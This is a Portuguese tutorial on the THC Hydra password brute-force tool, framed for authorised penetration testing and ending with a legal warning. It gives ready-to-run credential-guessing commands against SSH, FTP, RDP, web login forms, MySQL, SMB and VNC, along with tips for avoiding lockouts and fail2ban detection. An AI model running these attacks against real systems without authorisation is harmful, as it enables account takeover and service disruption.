Hydra

O cracker de logins online mais rápido e flexível — mais de 50 protocolos suportados

🔗 GitHub 📖 Documentação 📦 Download

O que é o Hydra?

O Hydra (também conhecido como THC Hydra) é uma ferramenta open source de força bruta de passwords online, desenvolvida pelo grupo The Hacker's Choice (THC). Foi projetada para ser paralelizada — múltiplas threads operam em paralelo para otimizar a eficiência e acelerar o processo de brute-force.

Ao contrário do Hashcat e John the Ripper, que fazem cracking offline de hashes já extraídos, o Hydra ataca serviços ativos online: SSH, FTP, RDP, HTTP, formulários web, bases de dados, e muitos outros. É a ferramenta de eleição para testar a força de passwords diretamente contra sistemas em execução.

Protocolos Suportados

O Hydra suporta atualmente mais de 50 protocolos e serviços:

Categoria Protocolos
Shell / Sistema ssh, telnet, rlogin, rsh, rexec, smb, rdp
Ficheiros / Transferência ftp, ftps, sftp, svn
Web / HTTP http-get, http-post-form, https-get, http-proxy
Bases de Dados mysql, postgres, mssql, oracle, firebird
Email smtp, pop3, imap
Outros vnc, snmp, ldap, socks5, icq, irc

Flags Essenciais

O Hydra tem uma interface simples e intuitiva. Estes são os parâmetros mais usados:

Flag Descrição
-l LOGIN Especifica um único username
-L FILE Ficheiro com lista de usernames (um por linha)
-p PASS Especifica uma única password
-P FILE Ficheiro com lista de passwords (wordlist)
-C FILE Ficheiro com formato login:password (combinação)
-t TASKS Número de threads paralelas (padrão: 16)
-s PORT Porta não padrão do serviço
-f Parar após o primeiro login/password encontrado
-e nsr Testes extra: n (null password), s (login=pass), r (login invertido)
-o FILE Guardar resultados em ficheiro
-vV Modo verboso — mostra cada tentativa
-w TIME Timeout em segundos para cada resposta (padrão: 32)
-M FILE Ficheiro com múltiplos alvos (um por linha)

Exemplos de Uso — do Básico ao Avançado

1. Verificar se o Hydra está instalado

Setup
hydra -h

Mostra a ajuda completa. No Kali Linux o Hydra já vem pré-instalado.

2. SSH — ataque com username e wordlist

SSH
hydra -l root -P passwords.txt ssh://192.168.1.10

Testa todas as passwords do passwords.txt contra o utilizador root no serviço SSH.

3. SSH — com lista de usernames e passwords

SSH
hydra -L users.txt -P passwords.txt ssh://192.168.1.10 -t 4 -f -e ns

-t 4 reduz threads para evitar bloqueio. -f para ao encontrar. -e ns testa null password e login=password primeiro.

4. SSH — porta não padrão

SSH
hydra -l admin -P passwords.txt -s 2222 ssh://192.168.1.10

Quando o SSH corre na porta 2222 em vez da 22.

5. FTP — ataque básico

FTP
hydra -L users.txt -P passwords.txt ftp://192.168.1.10

Brute-force contra o serviço FTP.

6. FTP — porta personalizada

FTP
hydra -l admin -P passwords.txt -s 2121 ftp://192.168.1.10

FTP em porta não padrão.

7. RDP — ataque a Windows Remote Desktop

RDP
hydra -l administrator -P passwords.txt rdp://192.168.1.10

Requer conhecimento da conta (ex: Administrator). RDP tem proteções — usar -t 1 para evitar bloqueio.

8. HTTP Basic Auth

Web
hydra -L users.txt -P passwords.txt -s 8080 http-get://192.168.1.10/protected

Autenticação HTTP básica (popup do browser).

9. Formulário web — http-post-form (essencial)

Web
hydra -l admin -P passwords.txt 192.168.1.10 http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid username or password"

Estrutura: <path>:<form-data>:<failure-string>. Os placeholders ^USER^ e ^PASS^ são substituídos pelo Hydra. A string de falha é o texto que aparece na página quando o login falha.

10. Formulário web — com prefixo F=

Web
hydra -l admin -P passwords.txt 192.168.1.10 http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"

O prefixo F= indica explicitamente que "incorrect" é a string de falha.

11. MySQL — ataque a base de dados

DB
hydra -l root -P passwords.txt mysql://192.168.1.10

Brute-force contra MySQL. Pode requerer a flag -e ns para testar password vazia.

12. SMB — ataque a Windows shares

SMB
hydra -L users.txt -P passwords.txt smb://192.168.1.10

Testa credenciais contra o serviço SMB (porta 445).

13. VNC — acesso remoto

VNC
hydra -P passwords.txt vnc://192.168.1.10

VNC muitas vezes usa apenas password, sem username.

14. Múltiplos alvos

Otimização
hydra -L users.txt -P passwords.txt -M targets.txt ssh

Ataca vários hosts em paralelo. targets.txt tem um IP/hostname por linha.

15. Guardar resultados

Otimização
hydra -l admin -P passwords.txt ssh://192.168.1.10 -o results.txt -f -vV

Guarda credenciais encontradas em results.txt, com output verboso.

16. Gerar passwords por padrão (-x)

Otimização
hydra -l admin -x 1:8:a1 ssh://192.168.1.10

1:8:a1 = comprimento 1 a 8, charset: a (minúsculas) + 1 (números). Adiciona A para maiúsculas, % para símbolos.

Workflow Típico: Nmap → Hydra → Verificação

O Hydra raramente é usado isolado. Um fluxo profissional de pentest segue esta sequência:

Fase Ferramenta Objetivo
1. Reconhecimento Nmap Descobrir portas abertas e serviços: nmap -sV -p- target
2. Confirmação Metasploit Verificar serviços e versões: use auxiliary/scanner/ssh/ssh_version
3. Ataque Hydra Testar credenciais fracas nos serviços confirmados
4. Verificação Cliente nativo Testar credenciais encontradas manualmente

Otimização e Boas Práticas

Hydra é rápido, mas mal configurado pode ser ineficaz ou detetado:

Problema Solução
Muitas threads causam bloqueio Usar -t 4 (SSH) ou -t 1 (RDP)
Timeout prematuro Aumentar -w 10 ou mais para protocolos lentos
Wordlist enorme e lenta Usar wordlist pequena e direcionada primeiro, depois expandir
Não encontra credenciais Testar combinações manuais primeiro (admin:admin, admin:password)
Detetado por fail2ban Reduzir threads, aumentar timeouts, usar -e ns para reduzir tentativas

Cheat Sheet rápido

-l user Username único
-L users.txt Lista de usernames
-P passwords.txt Wordlist de passwords
-t 4 Threads (menos = mais discreto)
-f Parar após sucesso
-e ns Null password + login=pass
-o results.txt Guardar resultados
-vV Output verboso
💡 Dica: A qualidade do dicionário é mais importante que o tamanho. Um dicionário direcionado de 100 passwords (com keywords da organização, variações comuns) tem mais sucesso que um rockyou.txt de 14 milhões de entradas. Ferramentas como CeWL podem gerar dicionários a partir do site da organização.
⚠️ Aviso legal: Usar o Hydra contra sistemas que não possuis ou para os quais não tens autorização explícita é ilegal e antiético. O Hydra gera um volume elevado de autenticações, o que pode ativar bloqueios de conta e causar negação de serviço. Usa apenas em testes autorizados, laboratórios ou avaliações defensivas com scope definido.
